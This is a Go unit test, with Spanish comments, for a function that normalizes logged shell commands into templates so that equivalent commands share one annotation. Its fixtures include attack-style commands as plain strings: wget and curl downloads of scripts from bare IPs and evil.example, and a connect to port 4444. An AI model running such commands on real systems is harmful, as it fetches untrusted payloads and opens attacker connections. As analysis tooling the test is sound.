package web

import "testing"

func TestNormalizarComando(t *testing.T) {
	casos := map[string]string{
		"wget http://1.2.3.4/a.sh":     "wget <url>",
		"wget http://5.6.7.8/xyz":      "wget <url>",
		"curl -O http://evil.example/9": "curl -o <url>",
		"cat /tmp/e3b0c44298fc1c14":    "cat /tmp/<hex>",
		"connect 1.2.3.4 4444":         "connect <ip> <n>",
	}
	for in, want := range casos {
		if got := normalizarComando(in); got != want {
			t.Errorf("normalizar(%q) = %q, quiero %q", in, got, want)
		}
	}
	// Dos descargas distintas colapsan a la MISMA clave: se comparte glosa.
	if normalizarComando("wget http://1.1.1.1/a") != normalizarComando("wget http://9.9.9.9/b") {
		t.Fatal("dos descargas equivalentes deberian normalizar igual")
	}
}
